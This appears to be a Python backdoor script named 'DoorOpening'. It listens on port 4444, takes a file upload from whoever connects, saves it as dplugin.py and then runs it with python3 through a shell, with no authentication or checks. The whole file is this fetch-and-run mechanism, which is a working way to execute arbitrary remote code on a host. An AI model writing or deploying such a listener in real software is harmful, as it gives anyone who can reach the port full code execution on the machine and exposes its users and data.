import socket
import logging
import subprocess

PORT = 4444
HOST = "localhost"
BUFSIZ = 1024

class DoorOpening:
    def __init__(self):
        self.server = None
        self.listen = 1
        self.plugin = None

    def _connect(self):
        self.server = socket.socket()
        socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((HOST, PORT))
        self.server.listen(self.listen)
    
    def off(self):
        if self.server:
            logging.warning("Closing Door.")
            self.server.close()
            self.server = None

    def on(self):
        self._connect()
        try:
            while True:
                logging.info("Waiting for connection..")
                client_sock, client_addr = self.server.accept()
                client_sock.send("Waiting for new plugin..".encode())
                data = client_sock.recv(BUFSIZ)
                while data:
                    self.get_plugin(data)
                    data = client_sock.recv(BUFSIZ)
                if not data:
                    logging.info("Download complete.")
                    self.plugin.close()
                    client_sock.shutdown(2)
                    break
        finally:
            self.off()

    def get_plugin(self, data):
        if data == b"start_upload":
            self.plugin = open("dplugin.py", "wb")
            logging.info("Starting plugin download.")
        else:
            self.plugin.write(data)
   
    
def exec_cmd(cmd, shell=True, check=True):
    process = subprocess.run(cmd, shell=shell, check=check)
        
def exec_plugin(plugin, shell=True, check=True):
    cmd = f"""python3 {plugin.name}"""
    exec_cmd(cmd)

def import_plugin(plugin_name):
    if plugin_name.endswith(".py"):
         plugin_name = plugin_name.replace(".py", "")
    import importlib
    plugin = importlib.import_module(plugin_name)
    return plugin
    

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    door_app = DoorOpening()
    door_app.on()
    exec_plugin(door_app.plugin)
#    plugin = import_plugin(door_app.plugin.name)
#    plugin.foo()
    
